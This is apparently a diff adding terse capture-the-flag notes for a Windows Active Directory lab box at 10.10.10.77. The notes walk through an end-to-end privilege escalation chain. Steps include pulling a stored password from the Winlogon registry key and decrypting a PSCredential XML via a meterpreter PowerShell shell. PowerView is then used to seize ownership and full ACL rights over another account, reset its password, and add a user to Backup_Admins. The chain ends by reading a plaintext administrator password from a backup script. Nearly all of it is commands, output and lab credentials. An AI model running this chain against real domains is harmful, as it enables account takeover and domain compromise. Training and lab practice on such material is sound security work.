@@ -1,0 +1,130 @@
+
+for getting nico password 
+
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+
+get another user
+
+C:\users\nico\desktop\cred.xml tom
+
+PSCredential and Import-CliXml
+
+meterpreter > load powershell
+Loading extension powershell...Success.
+meterpreter > powershell_shell 
+PS > 
+
+getting toms password
+
+PS > $creds = Import-CliXml -path "C:\users\nico\desktop\cred.xml"
+PS > $creds.getnetworkcredential().password
+1ts-mag1c!!!
+
+
+ssh -l tom 10.10.10.77
+pass:  1ts-mag1c!!!
+
+Microsoft Windows [Version 6.3.9600]                                                                                            
+(c) 2013 Microsoft Corporation. All rights reserved.                                                                            
+
+tom@REEL C:\Users\tom>    
+
+
+tom desktop we found 
+
+
+C:\Users\tom\Desktop\AD Audit                                                                                                   
+C:\Users\tom\Desktop\AD Audit\BloodHound                                                                                        
+C:\Users\tom\Desktop\AD Audit\note.txt                                                                                          
+C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors                                                                              
+C:\Users\tom\Desktop\AD Audit\BloodHound\PowerView.ps1                                                                          
+C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors\acls.csv                                                                     
+C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors\BloodHound.bin                                                               
+C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors\BloodHound_Old.ps1                                                           
+C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors\SharpHound.exe                                                               
+C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors\SharpHound.ps1 
+
+
+C:\Users\tom\Desktop\AD Audit\note.txt
+══════════════════════════════════════
+Findings:                                                                                                                       
+
+Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).                                  
+
+Maybe we should re-run Cypher query against other groups we've created.
+
+
+
+
+PS C:\Users\tom> cd '.\Desktop\AD Audit\BloodHound'                                                                             
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> . .\PowerView.ps1
+
+ we’ll make tom the owner of the claire 
+
+ Set-DomainObjectOwner -Identity claire -OwnerIdentity tom -verbose     
+
+VERBOSE: [Get-DomainSearcher] search base: LDAP://DC=HTB,DC=LOCAL                                                               
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=tom)(name=tom)(displayname=tom))))            
+VERBOSE: [Get-DomainSearcher] search base: LDAP://DC=HTB,DC=LOCAL                                                               
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=claire)(name=claire)(displayname=claire))))   
+VERBOSE: [Set-DomainObjectOwner] Attempting to set the owner for 'claire' to 'tom'
+
+we’ll grant All rights on the claire object to tom 
+
+ Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -rights All -verbose        
+
+VERBOSE: [Get-DomainSearcher] search base: LDAP://DC=HTB,DC=LOCAL                                                               
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=tom)(name=tom)(displayname=tom))))            
+VERBOSE: [Get-DomainSearcher] search base: LDAP://DC=HTB,DC=LOCAL                                                               
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=claire)(name=claire)(displayname=claire))))   
+VERBOSE: [Add-DomainObjectAcl] Granting principal CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL 'All' on CN=Claire                     
+Danes,CN=Users,DC=HTB,DC=LOCAL                                                                                                  
+VERBOSE: [Add-DomainObjectAcl] Granting principal CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL rights GUID                            
+'00000000-0000-0000-0000-000000000000' on CN=Claire Danes,CN=Users,DC=HTB,DC=LOCAL 
+
+Set-DomainUserPassword
+
+
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> $newpass = ConvertTo-SecureString "1qaz!QAZ2wsx@WSX" -AsPlainText -Force           
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> set-domainuserpassword -identity claire -accountpassword $newpass -verbose 
+
+VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'claire'                                              
+VERBOSE: [Set-DomainUserPassword] Password for user 'claire' successfully reset          
+
+ssh -l claire 10.10.10.77
+pass: 1qaz!QAZ2wsx@WSX
+
+Microsoft Windows [Version 6.3.9600]                                                                                            
+(c) 2013 Microsoft Corporation. All rights reserved.                                                                            
+
+claire@REEL C:\Users\claire>         
+
+Backup_Admins group tom
+
+$creds = new-object system.management.automation.pscredential("HTB\claire", $newpass)
+
+
+Add-DomainGroupMember -Identity backup_admins -members 'tom' -credential $creds -Verbose                                           
+
+
+Add-ObjectAcl -Rights All -TargetIdentity backup_admins -PrincipalIdentity tom -Credential $creds -verbose                    
+
+
+net user tom
+
+
+tom@REEL C:\Users\Administrator\Desktop\Backup Scripts>type BackupScript.ps1                                                    
+# admin password                                                                                                                
+$password="Cr4ckMeIfYouC4n!"  
+
+
+ssh -l administrator 10.10.10.77
+pass: Cr4ckMeIfYouC4n!
+-------------8<-------------
+
+Microsoft Windows [Version 6.3.9600]                                                                                            
+(c) 2013 Microsoft Corporation. All rights reserved.                                                                            
+
+administrator@REEL C:\Users\Administrator>type desktop\root.txt                                                                 
+1018...                                   
+
